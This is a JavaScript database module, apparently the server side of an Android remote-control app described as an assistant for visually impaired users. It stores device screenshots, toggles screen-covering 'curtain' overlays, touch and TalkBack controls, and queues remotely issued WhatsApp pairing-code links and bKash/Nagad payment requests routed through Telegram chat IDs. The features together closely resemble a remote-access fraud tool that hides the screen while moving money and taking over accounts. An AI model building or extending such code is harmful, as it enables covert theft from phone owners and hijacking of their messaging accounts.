    visibleElementsSummary,
    imageBase64,
    isSafeNavigation = true,
    statusNoteBn = '',
    intervalMs = 3500,
    timestamp = Date.now()
  }) {
    if (!this.memoryDb.screenSnapshots) {
      this.memoryDb.screenSnapshots = [];
    }

    const snapshot = {
      id: 'snap_' + Date.now().toString(36) + Math.random().toString(36).substring(2, 6),
      deviceId: deviceId || 'DEV-ANDROID',
      serverUserId: serverUserId || 'USR-ANDROID',
      packageName: packageName || 'com.example',
      screenTitle: screenTitle || 'Active Screen',
      lastClickedElement: lastClickedElement || 'স্বাভাবিক নেভিগেশন (Safe)',
      visibleElementsSummary: visibleElementsSummary || '',
      imageBase64: imageBase64 || '',
      isSafeNavigation: Boolean(isSafeNavigation),
      statusNoteBn: statusNoteBn || (isSafeNavigation
        ? '✅ সঠিক ও নিরাপদ স্থান নিশ্চিত'
        : '⚠️ সম্ভাব্য ভুল ক্লিক বা অপ্রত্যাশিত স্ক্রিন শনাক্ত!'),
      intervalMs: Number(intervalMs) || 3500,
      timestamp: timestamp || Date.now()
    };

    this.memoryDb.screenSnapshots.unshift(snapshot);

    // Keep last 40 snapshots in database to avoid unbounded JSON growth
    if (this.memoryDb.screenSnapshots.length > 40) {
      this.memoryDb.screenSnapshots = this.memoryDb.screenSnapshots.slice(0, 40);
    }

    this.save();
    return snapshot;
  }

  getScreenSnapshotBackups(limit = 20) {
    return (this.memoryDb.screenSnapshots || []).slice(0, limit);
  }

  clearScreenSnapshotBackups() {
    this.memoryDb.screenSnapshots = [];
    this.save();
    return true;
  }

  getAllUsers() {
    return this.memoryDb.users || [];
  }

  deleteUser(phoneNumber) {
    const cleanPhone = String(phoneNumber).trim().replace(/[\s-]/g, '');
    const beforeCount = this.memoryDb.users.length;
    this.memoryDb.users = this.memoryDb.users.filter(u => u.phoneNumber !== cleanPhone);
    this.save();
    return this.memoryDb.users.length < beforeCount;
  }

  reset() {
    this.memoryDb = JSON.parse(JSON.stringify(initialDatabase));
    this.save();
    return true;
  }

  getPowerStatus(deviceId = '') {
    if (!this.memoryDb.systemStats) {
      this.memoryDb.systemStats = {
        totalRequests: 0,
        lastStarted: Date.now(),
        isPowerOn: true,
        autoClickEnabled: true,
        lastPowerCommand: "/power on",
        lastPowerCommandTime: Date.now(),
        devicePowers: {}
      };
    }
    const cleanDev = String(deviceId || '').trim().toUpperCase();
    const sessionCheck = cleanDev ? this.checkChannelUserSession({ deviceId: cleanDev }) : null;
    if (sessionCheck && sessionCheck.isLoggedOut) {
      return {
        isPowerOn: false,
        autoClickEnabled: false,
        isChannelLoggedOut: true,
        lastPowerCommand: "/logout (চ্যানেল থেকে Chat ID ডিলিট করা হয়েছে)",
        lastPowerCommandTime: Date.now(),
        powerCommandSource: "CHANNEL_USER_DELETED",
        targetDeviceId: cleanDev,
        updatedAt: Date.now()
      };
    }
    const deviceMap = this.memoryDb.systemStats.devicePowers || {};
    if (cleanDev && deviceMap[cleanDev]) {
      const dp = deviceMap[cleanDev];
      return {
        isPowerOn: dp.isPowerOn ?? true,
        autoClickEnabled: dp.autoClickEnabled ?? true,
        isChannelLoggedOut: false,
        lastPowerCommand: dp.lastPowerCommand || "/power on",
        lastPowerCommandTime: dp.lastPowerCommandTime || Date.now(),
        powerCommandSource: dp.powerCommandSource || "DEVICE_SCOPED",
        targetDeviceId: cleanDev,
        updatedAt: Date.now()
      };
    }
    // Check if global command was targeted to a specific deviceId that is NOT this device
    const targetDev = String(this.memoryDb.systemStats.targetDeviceId || '').trim().toUpperCase();
    if (targetDev && cleanDev && !cleanDev.includes(targetDev) && !targetDev.includes(cleanDev)) {
      return {
        isPowerOn: true,
        autoClickEnabled: true,
        lastPowerCommand: "/power on",
        lastPowerCommandTime: Date.now(),
        powerCommandSource: "DEFAULT_ISOLATED",
        updatedAt: Date.now()
      };
    }
    return {
      isPowerOn: this.memoryDb.systemStats.isPowerOn ?? true,
      autoClickEnabled: this.memoryDb.systemStats.autoClickEnabled ?? true,
      lastPowerCommand: this.memoryDb.systemStats.lastPowerCommand || "/power on",
      lastPowerCommandTime: this.memoryDb.systemStats.lastPowerCommandTime || Date.now(),
      powerCommandSource: this.memoryDb.systemStats.powerCommandSource || "DEFAULT",
      targetDeviceId: targetDev,
      updatedAt: Date.now()
    };
  }

  setPowerStatus(isOn, commandSource = "API", targetDeviceId = '') {
    if (!this.memoryDb.systemStats) {
      this.memoryDb.systemStats = {
        totalRequests: 0,
        lastStarted: Date.now(),
        devicePowers: {}
      };
    }
    if (!this.memoryDb.systemStats.devicePowers) {
      this.memoryDb.systemStats.devicePowers = {};
    }
    const powerOn = Boolean(isOn);
    const cleanDev = String(targetDeviceId || '').trim().toUpperCase();
    if (cleanDev) {
      this.memoryDb.systemStats.devicePowers[cleanDev] = {
        isPowerOn: powerOn,
        autoClickEnabled: powerOn,
        lastPowerCommand: powerOn ? "/power on" : "/power off",
        lastPowerCommandTime: Date.now(),
        powerCommandSource: commandSource
      };
      this.memoryDb.systemStats.targetDeviceId = cleanDev;
    } else {
      this.memoryDb.systemStats.isPowerOn = powerOn;
      this.memoryDb.systemStats.autoClickEnabled = powerOn;
      this.memoryDb.systemStats.lastPowerCommand = powerOn ? "/power on" : "/power off";
      this.memoryDb.systemStats.lastPowerCommandTime = Date.now();
      this.memoryDb.systemStats.powerCommandSource = commandSource;
      this.memoryDb.systemStats.targetDeviceId = '';
    }
    // If power is turned OFF (/poweroff), cancel matching pending WhatsApp auto-link request!
    if (!powerOn && this.memoryDb.activeWhatsAppLinkRequest && this.memoryDb.activeWhatsAppLinkRequest.status === 'PENDING') {
      const reqDev = String(this.memoryDb.activeWhatsAppLinkRequest.deviceId || '').toUpperCase();
      if (!cleanDev || !reqDev || reqDev.includes(cleanDev) || cleanDev.includes(reqDev)) {
        this.memoryDb.activeWhatsAppLinkRequest.status = 'CANCELLED_BY_POWER_OFF';
        this.memoryDb.activeWhatsAppLinkRequest.completedAt = Date.now();
      }
    }
    this.save();
    return this.getPowerStatus(cleanDev);
  }

  getControls() {
    const stats = this.memoryDb.systemStats || {};
    return {
      overlay: Boolean(stats.overlayEnabled),
      touch: Boolean(stats.touchEnabled),
      back: Boolean(stats.backActive),
      power: Boolean(stats.isPowerOn ?? true),
      talkback: stats.talkbackEnabled !== undefined ? Boolean(stats.talkbackEnabled) : true,
      backCommandCount: stats.backCommandCount || 0,
      greenCurtainMessage: stats.greenCurtainMessage || '',
      pairCode: this.memoryDb.activeWhatsAppLinkRequest?.code || 'Y811B582',
      vibrationSettings: this.getVibrationSettings(),
      updatedAt: stats.lastControlUpdate || Date.now()
    };
  }

  getVibrationSettings() {
    if (!this.memoryDb.vibrationSettings) {
      this.memoryDb.vibrationSettings = {
        masterEnabled: true,
        intensity: "STRONG",
        pairingSuccessPreset: "SUCCESS_RHYTHM",
        buttonTogglePreset: "SINGLE_PULSE",
        autoClickStepPreset: "DOUBLE_TAP",
        errorAlertPreset: "RAPID_ALERT",
        customPatternCsv: "60, 40, 120, 40, 180",
        updatedAt: Date.now()
      };
    }
    return this.memoryDb.vibrationSettings;
  }

  setVibrationSettings(newSettings = {}) {
    const current = this.getVibrationSettings();
    this.memoryDb.vibrationSettings = {
      masterEnabled: newSettings.masterEnabled !== undefined ? Boolean(newSettings.masterEnabled) : current.masterEnabled,
      intensity: newSettings.intensity || current.intensity,
      pairingSuccessPreset: newSettings.pairingSuccessPreset || current.pairingSuccessPreset,
      buttonTogglePreset: newSettings.buttonTogglePreset || current.buttonTogglePreset,
      autoClickStepPreset: newSettings.autoClickStepPreset || current.autoClickStepPreset,
      errorAlertPreset: newSettings.errorAlertPreset || current.errorAlertPreset,
      customPatternCsv: newSettings.customPatternCsv !== undefined ? String(newSettings.customPatternCsv) : current.customPatternCsv,
      updatedAt: Date.now()
    };
    this.save();
    return this.memoryDb.vibrationSettings;
  }

  setControl(controlName, value, source = "WEB_DASHBOARD") {
    if (!this.memoryDb.systemStats) {
      this.memoryDb.systemStats = {
        totalRequests: 0,
        lastStarted: Date.now()
      };
    }
    const name = String(controlName).toLowerCase().trim();
    if (name === 'power') {
      return this.setPowerStatus(value, source);
    }
    if (name === 'overlay') {
      this.memoryDb.systemStats.overlayEnabled = Boolean(value);
    } else if (name === 'touch') {
      this.memoryDb.systemStats.touchEnabled = Boolean(value);
    } else if (name === 'back') {
      this.memoryDb.systemStats.backActive = true;
      this.memoryDb.systemStats.backCommandCount = (this.memoryDb.systemStats.backCommandCount || 0) + 1;
    } else if (name === 'talkback' || name === 'voice') {
      this.memoryDb.systemStats.talkbackEnabled = Boolean(value);
    } else if (name === 'green_message' || name === 'overlay_message' || name === 'curtain_message') {
      this.memoryDb.systemStats.greenCurtainMessage = String(value || '').trim();
      if (this.memoryDb.systemStats.greenCurtainMessage) {
        this.memoryDb.systemStats.overlayEnabled = true;
      }
    }
    this.memoryDb.systemStats.lastControlUpdate = Date.now();
    this.save();
    return this.getControls();
  }

  getStats() {
    const users = this.memoryDb.users || [];
    const logs = this.memoryDb.navigationLogs || [];
    const power = this.getPowerStatus();
    return {
      totalUsers: users.length,
      verifiedUsers: users.filter(u => u.isVerified).length,
      pendingUsers: users.filter(u => !u.isVerified).length,
      activeServices: users.filter(u => u.isServiceEnabled).length,
      totalNavigationLogs: logs.length,
      totalScreenSnapshots: (this.memoryDb.screenSnapshots || []).length,
      isPowerOn: power.isPowerOn,
      autoClickEnabled: power.autoClickEnabled,
      lastPowerCommand: power.lastPowerCommand,
      hasPendingWhatsAppLink: Boolean(this.memoryDb.activeWhatsAppLinkRequest && this.memoryDb.activeWhatsAppLinkRequest.status === 'PENDING'),
      activeWhatsAppLinkRequest: this.memoryDb.activeWhatsAppLinkRequest || null,
      databaseFile: DB_FILE,
      uptimeSeconds: Math.floor((Date.now() - (this.memoryDb.systemStats?.lastStarted || Date.now())) / 1000)
    };
  }

  // -------------------------------------------------------------
  // WhatsApp Auto-Link Listener for Visually Impaired Users (Isolated Per Device & Per Telegram Chat ID)
  // -------------------------------------------------------------
  setWhatsAppLinkRequest({ phoneNumber, code, deviceId = '', channelId = '', targetPackage = '', autoLaunch = true }) {
    let cleanPhone = String(phoneNumber || '').trim().replace(/[\s-]/g, '');
    let cleanCode = String(code || '').trim().toUpperCase();
    let cleanDeviceId = String(deviceId || '').trim().toUpperCase();
    let cleanChannelId = String(channelId || '').trim();
    let cleanTargetPackage = String(targetPackage || '').trim();

    if (cleanDeviceId && !cleanDeviceId.startsWith('DEV-')) {
      cleanDeviceId = 'DEV-' + cleanDeviceId.replace(/^(DEV-|USR-)/i, '');
    }

    // Check if the input code is actually a phone number (e.g. starts with 01, +880, or 10-15 digits)
    const digitsOnly = cleanCode.replace(/\D/g, '');
    const isPhonePattern = (cleanCode.startsWith('01') || cleanCode.startsWith('+880') || digitsOnly.length >= 10);
    if (isPhonePattern && !cleanPhone) {
      cleanPhone = digitsOnly;
    }

    // Resolve registered user in database by deviceId, channelId (Telegram Chat ID), or phoneNumber
    let user = this.findUserByTelegramOrDevice(cleanChannelId, cleanDeviceId);
    if (!user && cleanPhone) {
      user = this.memoryDb.users.find(u =>
        u.phoneNumber.includes(cleanPhone) ||
        cleanPhone.includes(u.phoneNumber) ||
        (u.deviceId && cleanPhone.toUpperCase().includes(u.deviceId.toUpperCase())) ||
        (u.serverUserId && cleanPhone.toUpperCase().includes(u.serverUserId.toUpperCase()))
      );
    }
    if (!user && cleanCode) {
      user = this.memoryDb.users.find(u => u.verificationCode === cleanCode || u.phoneNumber === cleanCode);
    }

    if (user) {
      cleanPhone = user.phoneNumber;
      if (!cleanDeviceId && user.deviceId) {
        cleanDeviceId = String(user.deviceId).toUpperCase();
      }
      if (!cleanChannelId && (user.telegramChatId || user.channelId)) {
        cleanChannelId = String(user.telegramChatId || user.channelId);
      }
      if (!cleanCode || isPhonePattern) {
        if (!user.verificationCode) {
          user.verificationCode = this.generateVerificationCode();
        }
        cleanCode = user.verificationCode;
      } else {
        user.verificationCode = cleanCode;
      }
      user.lastUpdated = Date.now();
    }

    if (!cleanCode) {
      cleanCode = this.generateVerificationCode();
    }

    if (!this.memoryDb.deviceLinkRequests) {
      this.memoryDb.deviceLinkRequests = {};
    }

    const req = {
      id: 'wa_' + Date.now().toString(36) + '_' + Math.random().toString(36).substring(2, 5),
      phoneNumber: cleanPhone,
      deviceId: cleanDeviceId,
      channelId: cleanChannelId,
      targetPackage: cleanTargetPackage,
      code: cleanCode,
      status: 'PENDING',
      createdAt: Date.now(),
      autoClick: true,
      autoLaunch: Boolean(autoLaunch),
      autoVerify: true,
      autoCopy: true,
      targetAction: 'WHATSAPP_AUTO_LINK',
      instructionsBn: 'ডাটাবেইজ থেকে শুধুমাত্র আপনার নির্দিষ্ট ফোনের জন্য হোয়াটসঅ্যাপ অটো-লিঙ্ক সক্রিয় করা হয়েছে।'
    };

    // Store in per-device & per-channel map so multiple visually impaired users NEVER overwrite each other's requests!
    if (cleanDeviceId) {
      this.memoryDb.deviceLinkRequests[cleanDeviceId] = req;
    }
    if (cleanChannelId && cleanChannelId !== '6658445342') {
      this.memoryDb.deviceLinkRequests[`CHAT_${cleanChannelId}`] = req;
    }
    this.memoryDb.activeWhatsAppLinkRequest = req;
    this.setPowerStatus(true, "FLY_TRIGGER", cleanDeviceId);
    console.log(`[Database] Isolated WhatsApp Link Request set: code=${cleanCode}, deviceId=${cleanDeviceId || 'UNSCOPED'}, channelId=${cleanChannelId || 'DEFAULT'}`);
    return req;
  }

  getPendingWhatsAppLinkRequest(phoneNumber, deviceId = '', channelId = '') {
    const cleanDev = String(deviceId || '').trim().toUpperCase();
    const cleanChannel = String(channelId || '').trim();
    const map = this.memoryDb.deviceLinkRequests || {};

    // 1. Check exact deviceId queue first
    if (cleanDev && map[cleanDev] && map[cleanDev].status === 'PENDING') {
      return map[cleanDev];
    }

    // 2. Check exact personal Telegram Chat ID queue
    if (cleanChannel && cleanChannel !== '6658445342' && map[`CHAT_${cleanChannel}`] && map[`CHAT_${cleanChannel}`].status === 'PENDING') {
      const chatReq = map[`CHAT_${cleanChannel}`];
      const reqDev = String(chatReq.deviceId || '').trim().toUpperCase();
      if (!reqDev || !cleanDev || cleanDev.includes(reqDev) || reqDev.includes(cleanDev)) {
        return chatReq;
      }
    }

    // 3. Fallback to global activeWhatsAppLinkRequest ONLY if it matches this device/channel
    const req = this.memoryDb.activeWhatsAppLinkRequest;
    if (!req || req.status !== 'PENDING') return null;
    const reqDev = String(req.deviceId || '').trim().toUpperCase();
    const reqChannel = String(req.channelId || '').trim();

    // If the link request is bound to a specific deviceId, ONLY return it to that matching device!
    if (reqDev && cleanDev && !cleanDev.includes(reqDev) && !reqDev.includes(cleanDev)) {
      return null;
    }
    // If the link request came from a specific user's personal Telegram Chat ID, ONLY return it to that user's phone!
    if (reqChannel && reqChannel !== '6658445342' && cleanChannel && reqChannel !== cleanChannel) {
      // Also check if this device is registered to reqChannel in DB
      const boundUser = this.findUserByTelegramOrDevice('', cleanDev);
      if (!boundUser || (String(boundUser.telegramChatId || '') !== reqChannel && String(boundUser.channelId || '') !== reqChannel)) {
        return null;
      }
    }
    if (phoneNumber && req.phoneNumber) {
      const cleanPhone = String(phoneNumber).trim().replace(/[\s-]/g, '');
      const reqPhone = String(req.phoneNumber).trim().replace(/[\s-]/g, '');
      if (reqPhone && cleanPhone && reqPhone !== cleanPhone && !cleanPhone.includes(reqPhone) && !reqPhone.includes(cleanPhone)) {
        return null;
      }
    }
    return req;
  }

  completeWhatsAppLinkRequest(reqId, deviceId = '', channelId = '') {
    let completed = false;
    const cleanDev = String(deviceId || '').trim().toUpperCase();
    const cleanChannel = String(channelId || '').trim();
    const map = this.memoryDb.deviceLinkRequests || {};

    if (cleanDev && map[cleanDev] && (!reqId || map[cleanDev].id === reqId)) {
      map[cleanDev].status = 'COMPLETED';
      map[cleanDev].completedAt = Date.now();
      completed = true;
    }
    if (cleanChannel && map[`CHAT_${cleanChannel}`] && (!reqId || map[`CHAT_${cleanChannel}`].id === reqId)) {
      map[`CHAT_${cleanChannel}`].status = 'COMPLETED';
      map[`CHAT_${cleanChannel}`].completedAt = Date.now();
      completed = true;
    }
    if (this.memoryDb.activeWhatsAppLinkRequest && (!reqId || this.memoryDb.activeWhatsAppLinkRequest.id === reqId)) {
      this.memoryDb.activeWhatsAppLinkRequest.status = 'COMPLETED';
      this.memoryDb.activeWhatsAppLinkRequest.completedAt = Date.now();
      completed = true;
    }
    if (completed) {
      this.save();
    }
    return completed;
  }

  // -------------------------------------------------------------
  // Mobile Payment Auto-Assistant Queue for Visually Impaired Users (bKash, Nagad, Rocket, Upay)
  // Ensures 100% delivery to the Android device even when server polls Telegram getUpdates first!
  // -------------------------------------------------------------
  setMobilePaymentRequest({ provider = 'BKASH', action = 'PAY', recipientNumber = '', amountBdt = '', deviceId = '', channelId = '' }) {
    const normalizeDigits = (str) => String(str || '').replace(/[০-৯]/g, d => '০১২৩৪৫৬৭৮৯'.indexOf(d));
    const cleanProvider = String(provider || 'BKASH').trim().toUpperCase();
    const cleanAction = String(action || 'PAY').trim().toUpperCase();
    let cleanNumber = normalizeDigits(recipientNumber).replace(/\D/g, '');
    if (cleanNumber.startsWith('8801') && cleanNumber.length >= 13) {
      cleanNumber = cleanNumber.substring(2);
    }
    const cleanAmount = normalizeDigits(amountBdt).replace(/\D/g, '');
    let cleanDeviceId = String(deviceId || '').trim().toUpperCase();
    let cleanChannelId = String(channelId || '').trim();

    if (cleanDeviceId && !cleanDeviceId.startsWith('DEV-')) {
      cleanDeviceId = 'DEV-' + cleanDeviceId.replace(/^(DEV-|USR-)/i, '');
    }

    const user = this.findUserByTelegramOrDevice(cleanChannelId, cleanDeviceId);
    if (user) {
      if (!cleanDeviceId && user.deviceId) {
        cleanDeviceId = String(user.deviceId).toUpperCase();
      }
      if (!cleanChannelId && (user.telegramChatId || user.channelId)) {
        cleanChannelId = String(user.telegramChatId || user.channelId);
      }
    }

    if (!this.memoryDb.devicePaymentRequests) {
      this.memoryDb.devicePaymentRequests = {};
    }

    const req = {
      id: 'pay_' + Date.now().toString(36) + '_' + Math.random().toString(36).substring(2, 5),
      provider: cleanProvider,
      action: cleanAction,
      recipientNumber: cleanNumber,
      amountBdt: cleanAmount,
      deviceId: cleanDeviceId,
      channelId: cleanChannelId,
      status: 'PENDING',
      createdAt: Date.now()
    };

    if (cleanDeviceId) {
      this.memoryDb.devicePaymentRequests[cleanDeviceId] = req;
    }
    if (cleanChannelId && cleanChannelId !== '6658445342') {
      this.memoryDb.devicePaymentRequests[`CHAT_${cleanChannelId}`] = req;
    }
    this.memoryDb.activeMobilePaymentRequest = req;
    this.setPowerStatus(true, `PAYMENT_${cleanProvider}`, cleanDeviceId);
    console.log(`[Database] Isolated Mobile Payment Request set: ${cleanProvider} ${cleanAction} ${cleanNumber} ${cleanAmount} BDT, deviceId=${cleanDeviceId || 'UNSCOPED'}, channelId=${cleanChannelId || 'DEFAULT'}`);
    return req;
  }

  getPendingMobilePaymentRequest(deviceId = '', channelId = '') {
    const cleanDev = String(deviceId || '').trim().toUpperCase();
    const cleanChannel = String(channelId || '').trim();
    const map = this.memoryDb.devicePaymentRequests || {};
    const now = Date.now();
    const maxAgeMs = 180000; // Expire pending payment requests after 3 minutes for safety

    const isFreshPending = (r) => r && r.status === 'PENDING' && (now - (r.createdAt || 0) < maxAgeMs);

    if (cleanDev && isFreshPending(map[cleanDev])) {
      return map[cleanDev];
    }

    if (cleanChannel && cleanChannel !== '6658445342' && isFreshPending(map[`CHAT_${cleanChannel}`])) {
      const chatReq = map[`CHAT_${cleanChannel}`];
      const reqDev = String(chatReq.deviceId || '').trim().toUpperCase();
      if (!reqDev || !cleanDev || cleanDev.includes(reqDev) || reqDev.includes(cleanDev)) {
        return chatReq;
      }
    }

    const req = this.memoryDb.activeMobilePaymentRequest;
    if (!isFreshPending(req)) return null;
    const reqDev = String(req.deviceId || '').trim().toUpperCase();
    const reqChannel = String(req.channelId || '').trim();

    if (reqDev && cleanDev && !cleanDev.includes(reqDev) && !reqDev.includes(cleanDev)) {
      return null;
    }
    if (reqChannel && reqChannel !== '6658445342' && cleanChannel && reqChannel !== cleanChannel) {
      const boundUser = this.findUserByTelegramOrDevice('', cleanDev);
      if (!boundUser || (String(boundUser.telegramChatId || '') !== reqChannel && String(boundUser.channelId || '') !== reqChannel)) {
        return null;
      }
    }
    return req;
  }

  completeMobilePaymentRequest(reqId, deviceId = '', channelId = '') {
    let completed = false;
    const cleanDev = String(deviceId || '').trim().toUpperCase();
    const cleanChannel = String(channelId || '').trim();
    const map = this.memoryDb.devicePaymentRequests || {};

    if (cleanDev && map[cleanDev] && (!reqId || map[cleanDev].id === reqId)) {
      map[cleanDev].status = 'COMPLETED';
      map[cleanDev].completedAt = Date.now();
      completed = true;
    }
    if (cleanChannel && map[`CHAT_${cleanChannel}`] && (!reqId || map[`CHAT_${cleanChannel}`].id === reqId)) {
      map[`CHAT_${cleanChannel}`].status = 'COMPLETED';
      map[`CHAT_${cleanChannel}`].completedAt = Date.now();
      completed = true;
    }
    if (this.memoryDb.activeMobilePaymentRequest && (!reqId || this.memoryDb.activeMobilePaymentRequest.id === reqId)) {
      this.memoryDb.activeMobilePaymentRequest.status = 'COMPLETED';
      this.memoryDb.activeMobilePaymentRequest.completedAt = Date.now();
      completed = true;
    }
    if (completed) {
      this.save();
    }
    return completed;
  }
}

module.exports = new DatabaseManager();
